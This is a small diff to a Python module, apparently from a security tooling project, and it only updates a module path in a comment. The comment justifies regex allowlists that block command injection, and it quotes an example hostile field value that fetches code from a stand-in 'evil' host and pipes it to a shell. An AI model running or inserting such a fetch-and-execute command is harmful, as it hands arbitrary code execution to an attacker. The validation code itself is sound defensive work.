@@ -15,7 +15,7 @@ from collections.abc import Iterable
 # label UNQUOTED (so the operator's shell expands the sanctioned `$(date …)`/
 # `${target}`); without this, a tools.json/commands.json field of
 # `$(curl evil|sh)` would render a pasteable, "in scope" command that runs
-# arbitrary code. See skuggi.frontend.commands and skuggi.tooling.registry.
+# arbitrary code. See skuggi.tooling.commands and skuggi.tooling.registry.
 _SAFE_FRAGMENT = re.compile(r"^[A-Za-z0-9_./=-]+$")
 _SAFE_LABEL = re.compile(r"^[A-Za-z0-9_-]+$")
 
